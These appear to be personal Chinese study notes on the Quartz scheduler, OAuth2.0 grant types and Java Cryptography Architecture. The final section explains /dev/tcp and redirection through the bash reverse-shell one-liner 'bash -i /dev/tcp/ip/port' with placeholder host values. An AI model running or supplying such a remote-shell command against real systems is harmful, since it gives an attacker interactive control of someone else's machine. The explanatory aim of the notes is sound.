接口说明

核心接口介绍：

  • Scheduler - the main API for interacting with the scheduler.
    接口，代表调度器
  • Job - an interface to be implemented by components that you wish to have executed by the scheduler.
    接口，通过implement Job接口，在excute方法中完善要执行的任务，关注执行的任务本身
  • JobDetail - used to define instances of Jobs.
    接口，更加具体的Job，定义了job的name和所属group，需通过JobBuilder构建出来
  • Trigger - a component that defines the schedule upon which a given Job will be executed.
    接口，代表触发器，定义何时触发任务，定义了trigger的name和所属group，需通过TriggerBuilder构建出来。在Scheduler将jobDetial和Trigger绑定起来后，才能指定要触发的JobDetial对象。
  • JobBuilder - used to define/build JobDetail instances, which define instances of Jobs.
    类，用于build JobDetail
  • TriggerBuilder - used to define/build Trigger instances.
    类，用于build Trigger

Scheduler调度器的生命周期

Scheduler通过scheduleJob(job，trigger)方法了解在何时触发任务，但只有执行start()方法后才会真正开始调度。

并在执行shoutdown()方法后结束调度。

在两个方法中间时间段内，进行任务的触发。如果shoutdown()方法开始，都没有触发任务，则再也不会触发。

Identities身份

identities是用来定位Job和Trigger的唯一标识符，通过name和group的组合成的key进行定位

此处job.getKey()=group1.job1

Job和JobDetial

we refer to each stored JobDetail as a “job definition” or “JobDetail instance”

we refer to a each executing job as a “job instance” or “instance of a job definition”

we are referring to the class implementing the job interface, we usually use the term “job class”

前面已经说过两者的关系，每个JobDetial都需要绑定一个Job，这样Scheduler在获得JobDetial后就知道要执行的Job。

值得注意的是，在Job被触发时，Scheduler会创建一个Job的new instance来执行excute()方法，执行完成后删除被执行Job实例的引用，并回收。

这种设计带来两个影响：

1.该Job实现需有一个无参构造，以便Scheduler创建实例。

2.该Job是无状态的，在Job类上定义有状态的数据字段是没有意义的，因为它的值不会在执行作业之间保留。

如果想为Job instance提供properties/configuration，以及Job执行之中追踪其状态，那么就需要使用到JobDetail属性中的JobDataMap

JobDataMap

如果在Job类中，设置了setter方法，如为上述的jobSays变量设置了setJobSays()方法，则Quartz会在new instance时为其从JobDataMap中找出并自动注入，省去从JobExecutionContext中找到JobDataMap再找到jobSays这几步。

不光是在JobDetial中有JobDATaMap，在Trigger中也可以存储JobDataMap，往往拥于一个被不同类型Trigger触发的Job，用于被特定Trigger触发时所传入的数据

JobDetial的JobDataMap获取：JobDataMap dataMap = context.getJobDetail().getJobDataMap();

Trigger的JobDataMap获取：JobDataMap dataMap = context.getTrigger().getJobDataMap();

上述两者JobDataMap的合并后的JobDataMap获取：JobDataMap dataMap = context.getMergedJobDataMap();

合并时，在map中key相同的情况下，Trigger的value会覆盖JobDetial的value

Job State和Concurrency

以下是关于job state data(aka JobDataMap)和concurrency的一些注解

@DisallowConcurrentExecution是添加在Job类上的的注解，用于告知Quartz不要去执行多个job definition的instance。

说明：前面已经说过Job和JobDetial之间的关系，因此可以知道当JobDetial被Trigger触发时，会创建job instance(也称为instance of a job definition)。当添加上述注解时，假设同一个JobDetial instance被多个不同的Trigger同时触发，只会允许一个instance of a job definition执行任务。阻止并发。

假设有两个JobDetial instance，在同一时间被触发，此时并发会被允许。

@PersistJobDataAfterExecution是添加在Job类上的的注解，用于告知Quartz在excute()方法执行完成后(没有exception的情况下)，更新JobDetial的副本，以便同一JobDetail的下一次excute()方法执行时，获取的JobDATaMap是更新的值，而不是原始存储的值。

如果您使用@PersistJobDataAfterExecution注释，则应强烈考虑同时使用@DisallowConcurrentExecution注释，以避免在同一作业（JobDetail）的两个实例同时执行时，可能会混淆（竞争条件）存储的数据。

Job的一些其他特性

Durability-作业是不持久的是指，一旦不再有任何活跃的Trigger与之关联，它就会自动从scheduler中删除。换句话说，不持久的Job的寿命受其Trigger的限制。

RequestsRecovery -Job“请求恢复”是指，job在excuting时，遭遇了在scheduler的“ hard shoutdown”（即进程运行时崩溃了，或者机器关机了），那么当scheduler再次start时，它会重新执行。在这种情况下，JobExecutionContext.isRecovery（）方法将返回true。

JobExecutionException

关于excute()方法涉及的Exception，允许从execute()方法抛出的唯一的Exception（包括RuntimeException）是JobExecutionException.

因此，通常应该使用“try-catch”块来包装execute方法的全部内容。

此外还可以通过JobExecutionException向scheduler告知，如何处理不同情况下的异常

Trigger

Trigger的通用属性

  • jobKey- 当Trigger被触发时，jobKey可以标识符唯一识别Job的身份

  • startTime - 该属性指示Trigger的计划首次生效的时间。该值是一个java.util.Date类，用于定义给定日历日期的某个时刻。对于某些Trigger类型，Trigger的确会在start time(固定时刻)触发；而对于另外某些Trigger类型，startTime是作为schedule(某个时间计划)的触发时间，比如现在是1月1日，设置startTime为4月1日，schedule设置为每月的第五天，那么直到4月1号，该schedule都不会触发，到了4月5日Trigger才会在schedule的启动下第一次触发。

  • endTime-该属性用于指示Trigger的schedule何时不再生效，如schedule设置为每月的第五天，那么endTime设置为7月1日，那么它最后一次触发为6月5日

Priority属性

某些情况下，当你设置了许多Trigger，又或者你的Quartz 线程池只有少量的worker threads，不足以同时启动所有的Trigger。这种情况下，你可能想控制某一个Trigger优先触发，此时可以设置priority属性。如果要同时触发N个Trigger，但当前只有Z个worker threads可用，则将首先执行优先级最高的前Z个Trigger。如果您没有在Trigger上设置优先级，那么它将使用默认的优先级5。优先级允许使用任何整数值，无论是正数还是负数。

Misfire Instructions属性

misfire是指 persistent Trigger “错失”它的触发，原因可能是 scheduler shutdown了或者在Quartz的线程池中没有可使用的线程去执行Job了。

SimpleTrigger

以下情况推荐使用SimpleTrigger：

1.如果你有一个Job只需要在某个特定时间点excute一次

2.在某个特定时间点excute一次，然后以特定的时间间隔重复。

例如，希望在2015年1月13日上午11:23:54准时触发，或者您希望它在该时间触发，然后每十秒再触发五次

因此对于SimpleTrigger有这么几个特征：start-time、end-time、repeat count(重复次数)、repeat interval(重复间隔)

repeat count的值可以为zero、positive integer、SimpleTrigger.REPEAT_INDEFINITELY；

repeat interval值必须为zero、positive long，表示毫秒数。需要注意当repeat interval设为0时，会造成repeat count被同时触发

endTime值如果被确定，那么会覆盖repeat count值。这个属性的用处是：如果你想创建一个Trigger，比如每10秒触发一次，直到给定的时刻，而不必计算它在开始时间和结束时间之间重复的次数。这样就可以简单地指定endTime，然后将repeat count设置为repeat_INDEFINITELY（也可以指定某个巨大数字的repeat count）。

SimpleTrigger instance的创建是通过TriggerBuilder，以及利用SimpleScheduleBuilder为SimpleTrigger添加schedule

需要指出的是，如TriggerBuilder或者Quartz的其他Builder，如果在没有调用withIdentity(..)*时会为该trigger随机设置name，如果没有调用startAt()则会为假定starttime为当前current time。

Job Stores

JobStore负责追踪您提供给scheduler的所有“work data”：job、trigger、calendars等。为Quartz scheduler实例选择合适的JobStore是重要的一步。幸运的是，一旦你了解了它们之间的区别，这个选择应该很容易。你可以在向SchedulerFactory提供的用于生成配置文件或配置类中声明你的scheduler使用哪一个Jobstore

注意：永远不要在代码中使用JobStore实例。出于某种原因，许多人试图这样做。因为JobStore实例是用于Quartz的幕后使用。你必须告诉Quartz（通过configuration）要使用哪个JobStore，但之后你应该只使用代码中的Scheduler接口。

RAMJobStore

RAMJobStore是最容易使用的jobstore，同时表现最好（cup time层面）。RAMJobStore以一种显而易见的方式命名：它将所有数据保存在RAM中。这就是它闪电般快速的原因，也是它配置如此简单的原因。缺点是，当应用程序结束（或崩溃）时，所有的调度信息都会丢失——这意味着RAMJobStore无法遵守作业和触发器上的“非波动性”设置。对于某些应用程序来说，这是可以接受的，甚至是所需的行为，但对于其他应用程序而言，这可能是灾难性的。

JDBCJobStore

JDBCJobStore的名称也很恰当——它通过JDBC将所有数据保存在数据库中。正因为如此，它的配置比RAMJobStore要复杂一些，而且速度也没有RAMJobStore快。然而，性能下降并不是很糟糕，尤其是如果您在primary keys上构建带有索引的数据库表。在一组具有良好局域网（在scheduler和database之间）的相当现代的机器上，检索和更新触发的时间通常不到10毫秒。

DBCJobStore几乎适用于任何数据库，它已被广泛用于Oracle、PostgreSQL、MySQL、MS SQLServer、HSQLDB和DB2。要使用JDBCJobStore，必须首先创建一组database tables供Quartz使用。您可以在Quartz发行版的“docs/dbTables”目录中找到创建表的SQL脚本。如果您的数据库类型还没有对应脚本，只需查看其中一个现有的脚本，并以相应方式对其进行修改。需要注意的一点是，在这些脚本中，所有表都以前缀“QRTZ_”开头（例如表“QRTZ_TRIGGERS”和“QRTZ_JOB_DETAIL”）。这个前缀实际上并不绝对，只要您通知JDBCJobStore前缀是什么（在Quartz properties中）。对于同一数据库中的多个scheduler实例，使用不同的前缀可能有助于创建多组tables。

一旦创建了table，在配置和启动JDBCJobStore之前，您还有一个重要的决定要做。您需要决定该application需要什么类型的transactions。如果您不需要将scheduling commands（如添加和删除Trigger）与transactions绑定，那么您可以使用JobStoreTX作为JobStore来让Quartz管理事务（这是最常见的选择）。

如果您需要Quartz与其他事务一起工作（即在J2EE应用程序服务器内），那么您应该使用JobStoreCMT——在这种情况下，Quartz将让应用程序服务器容器管理事务。

难题的最后一部分是设置一个DataSource，JDBCJobStore可以从中获取到数据库的连接。数据源是使用几种不同方法之一在Quartz properties中定义的。一种方法是让Quartz通过提供数据库的所有连接信息来创建和管理DataSource本身。另一种方法是通过向JDBCJobStore提供DataSource的JNDI名称，让Quartz使用application server 管理的DataSource。有关properties的详细信息，请参阅“docs/config”文件夹中的示例配置文件。

要使用JDBCJobStore（假设您使用的是StdSchedulerFactory），您首先需要将Quartz配置的JobStore类属性设置为org.Quartz.impl.JDBCJobStore.JobStoreTX或org.Quartz.impl.jdbc JobStore.JobStoreCMT，具体取决于您根据上述几段中的解释所做的选择。

OAuth2.0

定义：允许第三方应用经授权后访问目标资源服务器的信息

用处：如第三方登录

举例：我登录微博，使用微信跳转登录，授权后第三方应用微博利用手中的token访问微信资源得到我这名用户的相关讯息，之后根据这些信息确定登陆人员身份，全程不需要输入用户名和密码

注意：第三方登录本质上是利用OAuth2.0获取目标资源服务器信息后的一种扩展功能

OAuth2.0分为四类，不详细介绍，详细可参考阮一峰OAuth2.0，记录一下理解

1.授权码(Authorization code)

注意：为什么认证服务器需要传输给第三方应用授权码，而不是直接传送令牌给第三方应用后端？

答：因为第三方应用获得授权码，是根据用户浏览器访问重定向链接https://a.com/callback?code=AUTHORIZATION_CODE后获得的，如果获取令牌也只能通过这种用户访问包含令牌的重定向链接方式获得，然而在OAuth2.0中重定向链接是允许http链接的，而http链接容易受到中间人拦截攻击，导致令牌泄露。当第三方应用在后端得到授权码，访问令牌时会带上 client_id和 client_secret，这是第三方应用私有的，获得的令牌也只能存储后端。这样保证了，即使授权码泄露也没有关系。

2.隐藏式(implicit)

用户直接向认证服务器请求令牌，认证服务器不在重定向连接中加入授权码，而是直接加入令牌，因为某些网站不具备后端，所以采用此方式，所以此方式在安全要求不高的场景使用，仅会话期间session有效

令牌的位置是 URL 锚点（fragment），而不是查询字符串（querystring）

答RFC1738定义了一种提供引用资源的机制，而不是引用资源的位置，是通过在url尾端加上“#”再附上一个锚点标识符(anchor identifier)，如下是一个fragment url 指向一个名为section_2锚点（anchor）

3.密码式(password)

直接将认证网站的登录密码给第三方应用，除非高度信任，不建议使用

4.凭证式(client credentials)

适用于没有前端的命令行应用，即在命令行下请求令牌。这种方式给出的令牌，是针对第三方应用的，而不是针对用户的，即有可能多个用户共享同一个令牌。

JCA :Java密码体系结构 Java Cryptography Architecture

JCE（Java Cryptography Extension），在早期JDK版本中，由于受美国的密码出口条例约束，Java中涉及加解密功能的API被限制出口，所以Java中安全组件被分成了两部分: 不含加密功能的JCA（Java Cryptography Architecture ）和含加密功能的JCE（Java Cryptography Extension）。现在JCE已经捆绑在JDK中，所以，这里JCE是JCA的一部分

JCA包含一个提供者【Provider】体系结构和一组用于数字签名，消息摘要（哈希），证书和证书验证，加密（对称/非对称块/流密码），密钥生成管理和安全随机数生成等等的API。
这些API允许开发人员将安全性轻松集成到应用程序代码中。

JCA包含两个软件组件：

  • 定义和支持Provider为其提供实现的加密服务的框架。 这个框架包含了诸如java.security，javax.crypto，javax.crypto.spec和javax.crypto.interfaces等软件包。

  • Sun，SunRsaSign，SunJCE等实际提供者都包含了具体的加密实现。

架构

加密服务提供者（CSP）与java.security.Provider

java.security.Provider是所有安全提供程序的基类。 每个CSP都包含这个类的一个实例，它包含了提供者的名字，并列出了它实现的所有安全服务/算法。 当需要特定算法的实例时，JCA框架会咨询提供者的数据库，如果找到合适的匹配项，则创建该实例。

Provider包含一个包（或一组包），为声明的加密算法提供具体的实现。 每个JDK安装都默认安装并配置了一个或多个提供程序。其他提供者可以静态或动态添加（参见Provider和Security类）。客户端可以配置其运行时环境来指定提供程序的首选顺序。 首选顺序是在没有请求特定提供者时提供者搜索请求的服务的顺序。

要使用JCA，应用程序只需要请求特定类型的对象（如MessageDigest）和特定的算法或服务（如“SHA-256”算法），并从一个已安装的提供者获取实现。 或者，程序可以请求来自特定提供者的对象。 每个提供者都有一个名字来引用它。

应用程序需要一个“AES”算法的javax.crypto.Cipher实例，并不关心使用哪个提供者。应用程序调用Cipher引擎类的getInstance（）工厂方法，然后请求JCA框架查找支持“AES”的第一个提供程序实例。该框架会咨询每个已安装的提供者，并获取提供者类的提供者实例

**/dev/tcp/**是Linux中的一个特殊设备，打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/

>& 和 0>&1

Linux 系统中，把一切都看做是文件，当进程打开现有文件或创建新文件时，内核向进程返回一个文件描述符，文件描述符就是内核为了高效管理已被打开的文件所创建的索引，用来指向被打开的文件。

所有执行I/O操作的系统调用都会通过文件描述符，即文件描述符可控制输入输出（输入/输出重定向****）

标准输入(stdin): 代码为 0 使用 < 或 << 默认设备键盘

标准输出(stdout): 代码为 1 使用 > 或 >> 默认设备显示器

标准错误输出(stderr): 代码为 2 使用 2> 或 2>> 默认设备显示器

>& 和 0>&1都有>&但是有不同的涵义

单独的>& ,代表标准错误输出(stderr)合并到标准输出(stdout)中 , >&word 等价于 &> word 都相当于 > word 2>&1

**>&**后面带有数字或者’-‘, 表示复制操作,如0>&1表示将标准输入(stdin)复制到了标准输出(stdout)里

本身这个bash -i /dev/tcp/ip/port就已经将 1 默认重定位到了ip所在主机上,再>&将2重定向到1里,0>&1也将输入定位到了标准输出里,所以0,1,2全都定位到了ip所在主机上了
